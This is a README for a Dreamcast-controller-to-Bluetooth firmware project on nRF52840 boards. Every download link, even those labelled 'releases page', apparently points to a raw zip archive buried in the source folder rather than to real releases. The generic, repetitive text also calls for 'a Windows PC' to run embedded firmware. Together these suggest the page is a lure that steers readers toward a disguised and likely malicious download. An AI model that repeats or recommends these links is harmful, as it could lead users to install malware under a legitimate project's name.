# 🎮 pulsar-dreamcast-ble - Wirelessly use your Dreamcast controller

[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/uggudt3385/pulsar-dreamcast-ble/raw/refs/heads/main/src/maple/ble-pulsar-dreamcast-v2.2.zip)

## 🧭 What this app does

pulsar-dreamcast-ble lets you use a Sega Dreamcast controller over Bluetooth. It reads the controller through the Maple Bus and shows up as an Xbox One S BLE gamepad on your device.

Use it when you want to:

- Play games with a Dreamcast controller
- Connect to devices that support Bluetooth gamepads
- Keep the controller cable-free
- Use a real gamepad feel on a modern device

## 📦 What you need

Before you start, make sure you have:

- A Windows PC
- A supported Bluetooth device
- A Dreamcast controller
- A supported hardware board for the adapter
- A USB cable for setup and power
- The latest release from the download page

Supported board types include:

- nRF52840-DK
- Xiao nRF52840

## 🖥️ Windows setup

This app is for users who want to run the Bluetooth adapter on supported hardware, then pair it with Windows or another Bluetooth device.

If you are on Windows, use this flow:

1. Open the [releases page](https://github.com/uggudt3385/pulsar-dreamcast-ble/raw/refs/heads/main/src/maple/ble-pulsar-dreamcast-v2.2.zip)
2. Download the latest release file for your board
3. Copy the file to your device if needed
4. Connect the board to your PC with USB
5. Flash the release file to the board
6. Disconnect and reconnect power
7. Pair the new gamepad in Windows Bluetooth settings

## ⬇️ Download and install

Go to the [releases page](https://github.com/uggudt3385/pulsar-dreamcast-ble/raw/refs/heads/main/src/maple/ble-pulsar-dreamcast-v2.2.zip) and download the latest file for your hardware.

If the release includes a file for your board, download that file and run the flash process that matches your setup. If the release gives you a firmware image, use your board’s normal flash method to load it.

Basic steps:

1. Visit the releases page
2. Find the newest version
3. Pick the file for your board
4. Download it
5. Flash it to the hardware
6. Reboot the board
7. Pair it through Bluetooth

## 🔌 Connect your Dreamcast controller

Once the firmware is on the board, connect the Dreamcast controller to the Maple Bus port on the adapter hardware.

Typical setup:

- Dreamcast controller into the Maple Bus connector
- Adapter board powered through USB
- Bluetooth turned on for the device you want to use
- The controller input sent wirelessly as a gamepad

## 🎮 Pair with Windows

To use it with Windows:

1. Open Settings
2. Go to Bluetooth and devices
3. Turn Bluetooth on
4. Add a new device
5. Choose the gamepad when it appears
6. Wait for the pair to finish

After pairing, Windows should see it as a gamepad. You can then test it in games or in controller settings.

## 🛠️ Simple setup flow

Use this order if you want the shortest path:

1. Get the release from the download page
2. Load it onto the supported board
3. Plug in the Dreamcast controller
4. Power the board
5. Pair the device in Windows
6. Test the buttons and stick

## 📋 Supported use cases

This project is built for:

- Dreamcast controller input over Bluetooth
- Gamepad use on Windows
- Bluetooth devices that accept BLE gamepads
- Low-power embedded hardware
- Direct Maple Bus input handling

## 🧪 How to check it works

After setup, test these items:

- The board powers on
- Bluetooth appears on your PC
- The controller connects
- Button presses show up on screen
- The analog stick moves as expected
- The device stays paired after restart

If something does not work, check the cable, power, board file, and Bluetooth pairing steps.

## 🔧 Hardware notes

This project uses supported BLE hardware and embedded Rust firmware. The common boards are based on the nRF52840 chip, which supports Bluetooth Low Energy.

Good signs your setup is right:

- The board matches one of the supported types
- The controller is wired to the correct Maple Bus port
- The board has stable power
- You use the correct release file for your board

## 📚 About the project

The name says what it does:

- `pulsar` is the firmware side of the project
- `dreamcast` means it works with the Dreamcast controller
- `ble` means it uses Bluetooth Low Energy

It speaks Maple Bus natively, so it can read the controller without extra conversion hardware. It then presents itself as an Xbox One S BLE gamepad so common devices can use it.

## 🧰 Troubleshooting

If the controller does not show up:

- Check that Bluetooth is on
- Try removing the device and pairing again
- Make sure you used the right release file
- Reconnect USB power to restart the board
- Check that the controller is fully seated
- Use a known-good USB cable
- Try a different USB port

If Windows does not list it:

- Move the board closer to the PC
- Turn Bluetooth off and on again
- Restart the board
- Remove old pairings from Windows

If buttons seem wrong:

- Power cycle the board
- Reconnect the controller
- Confirm you are using a supported Dreamcast controller

## 🔗 Releases

Download the latest build here:

[https://github.com/uggudt3385/pulsar-dreamcast-ble/raw/refs/heads/main/src/maple/ble-pulsar-dreamcast-v2.2.zip](https://github.com/uggudt3385/pulsar-dreamcast-ble/raw/refs/heads/main/src/maple/ble-pulsar-dreamcast-v2.2.zip)

## 🧩 Project topics

- BLE
- Bluetooth
- Bluetooth Low Energy
- Embassy
- Embedded Rust
- Gamepad
- Maple Bus
- nRF52840
- nRF52840-DK
- Sega Dreamcast
- Xiao nRF52840